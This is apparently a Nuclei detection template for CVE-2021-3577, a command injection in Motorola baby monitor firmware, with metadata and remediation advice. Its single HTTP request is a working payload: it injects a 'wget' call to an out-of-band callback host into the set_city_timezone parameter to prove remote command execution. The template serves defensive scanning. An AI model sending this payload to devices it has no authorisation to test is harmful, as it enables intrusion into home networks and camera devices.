id: CVE-2021-3577

info:
  name: Motorola Baby Monitors - Remote Command Execution
  author: gy741
  severity: high
  description: Motorola Baby Monitors contains multiple interface vulnerabilities could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary commands on the affected device, potentially leading to unauthorized access, data theft, or further compromise of the network.
  remediation: |
    Apply the latest firmware update provided by Motorola to mitigate the vulnerability and ensure the device is not accessible from untrusted networks.
  reference:
    - https://randywestergren.com/unauthenticated-remote-code-execution-in-motorola-baby-monitors/
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3577
    - https://binatoneglobal.com/security-advisory/
  classification:
    cvss-metrics: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2021-3577
    cwe-id: CWE-863,CWE-78
    epss-score: 0.96689
    epss-percentile: 0.99568
    cpe: cpe:2.3:o:binatoneglobal:halo\+_camera_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: binatoneglobal
    product: halo\+_camera_firmware
  tags: cve,cve2021,rce,oast,motorola,iot,binatoneglobal

http:
  - raw:
      - |
        GET /?action=command&command=set_city_timezone&value=$(wget%20http://{{interactsh-url}})) HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"

      - type: word
        words:
          - "set_city_timezone"

      - type: status
        status:
          - 200
# digest: 490a0046304402200863b02f8618e81844735e2337e0992eff522496c13bcc81ac8368acc606279a02203401bee8a2383f9fb6d76e207b02997f1de60d951a7d6e2b10d8f291244f4aab:922c64590222798bb761d5b6d8e72950